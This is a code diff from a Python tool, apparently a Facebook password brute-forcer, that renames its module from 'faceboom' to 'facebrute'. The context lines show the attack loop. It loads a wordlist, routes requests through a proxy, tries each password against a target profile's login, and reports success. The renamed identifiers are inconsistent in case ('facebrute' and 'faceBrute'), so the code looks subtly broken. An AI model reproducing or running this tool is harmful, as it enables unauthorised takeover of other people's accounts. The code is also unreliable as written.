@@ -209,7 +209,7 @@ def Main():
     facebrute.updateFaceBrute()
     sys.exit(1)
    elif target_profile:
-        faceboom.get_profile_id(target_profile)
+        facebrute.get_profile_id(target_profile)
         sys.exit(1)
    elif wordlist or single_passwd:
         if wordlist:
@@ -227,22 +227,22 @@ def Main():
                     sys.exit(1)
              print(wi+"["+yl+"~"+wi+"] Connecting To "+wi+"Proxy[\033[1;33m {} \033[1;37m]...".format(proxy if not ":" in proxy else proxy.split(":")[0]))
              final_proxy = proxy+":8080" if not ":" in proxy else proxy
-             if faceBoom.check_proxy(final_proxy):
-                faceBoom.useProxy = final_proxy
-                faceBoom.br.set_proxies({'https':faceBoom.useProxy, 'http':faceBoom.useProxy})
+             if faceBrute.check_proxy(final_proxy):
+                faceBrute.useProxy = final_proxy
+                faceBrute.br.set_proxies({'https':faceBrute.useProxy, 'http':faceBrute.useProxy})
                 print(wi+"["+gr+"Connected"+wi+"]")
              else:
                 errMsg("Connection Failed")
                 errMsg("Unable to connect to Proxy["+rd+str(proxy)+yl+"]")
                 sys.exit(1)
 
-        faceboom.banner(target,wordlist,single_passwd)
+        facebrute.banner(target,wordlist,single_passwd)
         loop,passwords = (1,open(wordlist).readlines()) if not single_passwd else ("~",[single_passwd])
         for passwd in passwords:
                 passwd = passwd.strip()
                 if len(passwd) <6:continue
                 write(wi+"["+yl+str(loop)+wi+"] Trying Password[ {"+yl+str(passwd)+wi+"} ]")
-                retCode = faceboom.login(target, passwd)
+                retCode = facebrute.login(target, passwd)
                 if retCode:
                     sys.stdout.write(wi+" ==> Login"+gr+" Success\n")
                     print(wi+"========================="+"="*len(passwd)+"======")
